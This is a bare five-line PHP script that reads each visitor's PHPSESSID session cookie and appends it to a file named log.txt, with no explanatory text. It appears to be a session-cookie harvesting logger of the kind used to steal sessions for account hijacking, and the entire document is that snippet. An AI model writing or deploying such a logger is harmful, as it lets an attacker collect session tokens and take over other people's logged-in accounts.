<?php
$cookie = $_COOKIE["PHPSESSID"];
$file = fopen('log.txt', 'a');
fwrite($file, $cookie . "\n\n");
?>
